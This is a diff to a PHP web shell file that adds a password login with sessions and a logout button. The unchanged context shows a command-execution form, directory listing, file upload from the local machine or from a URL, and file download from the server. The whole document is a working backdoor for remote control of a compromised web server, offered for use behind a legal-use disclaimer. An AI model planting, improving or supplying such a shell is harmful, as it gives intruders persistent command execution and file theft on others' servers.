@@ -1,16 +1,10 @@
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  The author accepts no liability
-// for damage caused by this tool.  If these terms are not acceptable to you, then
-// do not use this tool.
-
-<h2>Access Requested?</h2>
-<form method="POST" action="">
-    <label for="password">Password:</label>
-    <input type="password" name="password" id="password" required>
-    <button type="submit">Submit</button>
-</form>
+This tool may be used for legal purposes only.  
+Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. 
+If these terms are not acceptable to you, then do not use this tool. Respectfully, B3NDU.
 
 <?php
+session_start();
+
 // Check if the form is submitted
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Define the expected password
@@ -21,14 +15,36 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     // Check if the entered password matches the expected password
     if ($enteredPassword === $expectedPassword) {
-        // Password is correct, proceed with the web shell functionality
-
-        // ... Your existing PHP code for the web shell goes here ...
-
+        // Password is correct, set the session variable
+        $_SESSION['authenticated'] = true;
     } else {
         // Password is incorrect, display an error message
         echo 'Invalid password. Access denied.';
     }
+}
+
+// Check if the user is not logged in, display the login form
+if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+    ?>
+
+    <h2>Access Requested?</h2>
+    <form method="POST" action="">
+        <label for="password">Password:</label>
+        <input type="password" name="password" id="password" required>
+        <button type="submit">Submit</button>
+    </form>
+
+    <?php
+    // Stop executing the rest of the script
+    exit();
+}
+
+// Logout functionality
+if (isset($_POST['logout']) && $_POST['logout'] === 'true') {
+    // Destroy the session and redirect to the login form
+    session_destroy();
+    header('Location: web_shell.php');
+    exit();
 }
 ?>
 
@@ -47,7 +63,9 @@ if (isset($_GET['command'])) {
     echo '</pre>';
 }
 ?>
+
 <hr />
+
 <b>Retrieve File/Scan Directory</b> <br />
 Current file path: <?php echo __FILE__; ?> <br />
 <form method="GET" action="">
@@ -75,8 +93,11 @@ if (isset($_GET['path'])) {
     }
 }
 ?>
+
 </pre>
+
 <hr />
+
 <b>Upload File From Your Local Machine</b> <br />
 <form method="POST" action="" enctype="multipart/form-data">
     File(s): <input type="file" name="uploads[]" multiple="multiple" required="required" />
@@ -90,15 +111,17 @@ if (isset($_FILES['uploads']) && count($_FILES['uploads']) > 0) {
         if ($tmpPath != '') {
             $newPath = './' . $_FILES['uploads']['name'][$i];
             if (move_uploaded_file($tmpPath, $newPath)) {
-                echo 'Successfully uploaded ' .$_FILES['uploads']['name'][$i] . '<br />';
+                echo 'Successfully uploaded ' . $_FILES['uploads']['name'][$i] . '<br />';
             } else {
-                echo 'Unable to upload ' .$_FILES['uploads']['name'][$i] . '<br />';
+                echo 'Unable to upload ' . $_FILES['uploads']['name'][$i] . '<br />';
             }
         }
     }
 }
 ?>
+
 <hr />
+
 <b>Upload File From URL</b> <br />
 <form method="POST" action="">
     Filename to save: <input type="text" name="save_name" size="30" required="required" /> <br />
@@ -115,8 +138,11 @@ if (isset($_POST['save_name']) && isset($_POST['url'])) {
     }
 }
 ?>
+
 </pre>
+
 <hr />
+
 <b>Download File From Web Server</b> <br />
 <form method="GET" action="">
     Filename to download: <input type="text" name="download" size="100" required="required" /> <br />
@@ -139,6 +165,24 @@ if (isset($_GET['download'])) {
         echo 'File does not exist.';
     }
 }
-
 ?>
+
+<hr />
+
+<b>Logout</b> <br />
+<form method="POST" action="">
+    <input type="hidden" name="logout" value="true" />
+    <button type="submit">Logout</button>
+</form>
+<pre>
+<?php
+if (isset($_POST['logout']) && $_POST['logout'] === 'true') {
+    // Destroy the session and redirect to the login page
+    session_destroy();
+    header('Location: web_shell.php');
+    exit();
+}
+?>
+</pre>
+
 
